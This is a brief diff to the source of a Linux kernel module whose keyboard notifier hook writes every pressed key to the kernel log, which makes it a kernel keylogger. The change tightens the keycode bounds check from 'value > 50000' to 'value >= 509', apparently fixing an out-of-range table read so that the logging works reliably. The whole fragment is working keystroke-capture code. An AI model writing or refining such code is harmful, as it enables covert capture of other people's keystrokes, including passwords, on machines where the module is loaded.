@@ -13,7 +13,7 @@ MODULE_LICENSE("GPL");
 int key_hook(struct notifier_block *nblock, unsigned long code, void *_param){
 	struct keyboard_notifier_param *param = _param;
 
-	if(param->value > 50000) return NOTIFY_OK;
+	if(param->value >= 509) return NOTIFY_OK;
 
 	printk(KERN_INFO "%s", keycode[param->value]);
 
